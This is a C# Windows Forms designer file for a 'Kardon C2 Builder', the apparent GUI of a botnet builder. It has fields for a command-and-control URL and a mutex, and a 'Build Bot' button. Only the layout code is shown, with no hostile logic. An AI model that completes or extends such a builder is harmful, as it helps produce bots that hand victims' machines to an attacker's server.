namespace KardonBotBuilder
{
    partial class BuilderForm
    {
        private System.ComponentModel.IContainer components = null;
        private System.Windows.Forms.TextBox txtC2Url;
        private System.Windows.Forms.TextBox txtMutex;
        private System.Windows.Forms.Button btnBuild;
        private System.Windows.Forms.Label lblC2Url;
        private System.Windows.Forms.Label lblMutex;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.txtC2Url = new System.Windows.Forms.TextBox();
            this.txtMutex = new System.Windows.Forms.TextBox();
            this.btnBuild = new System.Windows.Forms.Button();
            this.lblC2Url = new System.Windows.Forms.Label();
            this.lblMutex = new System.Windows.Forms.Label();
            this.SuspendLayout();

            // 
            // lblC2Url
            // 
            this.lblC2Url.AutoSize = true;
            this.lblC2Url.Location = new System.Drawing.Point(30, 30);
            this.lblC2Url.Name = "lblC2Url";
            this.lblC2Url.Size = new System.Drawing.Size(46, 15);
            this.lblC2Url.Text = "C2 URL:";

            // 
            // txtC2Url
            // 
            this.txtC2Url.Location = new System.Drawing.Point(100, 27);
            this.txtC2Url.Name = "txtC2Url";
            this.txtC2Url.Size = new System.Drawing.Size(300, 23);

            // 
            // lblMutex
            // 
            this.lblMutex.AutoSize = true;
            this.lblMutex.Location = new System.Drawing.Point(30, 70);
            this.lblMutex.Name = "lblMutex";
            this.lblMutex.Size = new System.Drawing.Size(44, 15);
            this.lblMutex.Text = "Mutex:";

            // 
            // txtMutex
            // 
            this.txtMutex.Location = new System.Drawing.Point(100, 67);
            this.txtMutex.Name = "txtMutex";
            this.txtMutex.Size = new System.Drawing.Size(300, 23);

            // 
            // btnBuild
            // 
            this.btnBuild.Location = new System.Drawing.Point(100, 110);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(120, 30);
            this.btnBuild.Text = "Build Bot";
            this.btnBuild.UseVisualStyleBackColor = true;
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);

            // 
            // BuilderForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(440, 180);
            this.Controls.Add(this.lblC2Url);
            this.Controls.Add(this.txtC2Url);
            this.Controls.Add(this.lblMutex);
            this.Controls.Add(this.txtMutex);
            this.Controls.Add(this.btnBuild);
            this.Name = "BuilderForm";
            this.Text = "Kardon C2 Builder";
            this.Load += new System.EventHandler(this.BuilderForm_Load);
            this.ResumeLayout(false);
            this.PerformLayout();
        }
    }
}
